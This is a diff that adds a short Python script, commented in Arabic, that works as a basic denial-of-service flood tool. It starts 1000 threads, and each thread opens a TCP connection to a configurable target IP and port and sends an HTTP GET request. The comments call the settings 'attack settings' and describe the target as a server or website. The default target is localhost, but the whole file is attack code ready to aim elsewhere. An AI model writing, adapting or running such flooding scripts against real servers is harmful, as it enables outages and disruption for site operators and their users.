@@ -1,0 +1,27 @@
+import socket
+import threading
+
+# إعدادات الهجوم
+target_ip = "127.0.0.1"  # الهدف (IP السيرفر أو الموقع)
+target_port = 80          # المنفذ الهدف
+num_threads = 1000        # عدد الخيوط الموازية (يجب أن تستخدم بعناية!)
+
+# دالة لإرسال العديد من الطلبات (محاكاة للهجوم)
+def attack():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((target_ip, target_port))  # محاولة الاتصال بالهدف
+        sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))  # إرسال طلب HTTP
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        sock.close()
+
+# دالة لتشغيل الخيوط
+def run_attack():
+    for _ in range(num_threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+
+if __name__ == "__main__":
+    run_attack()
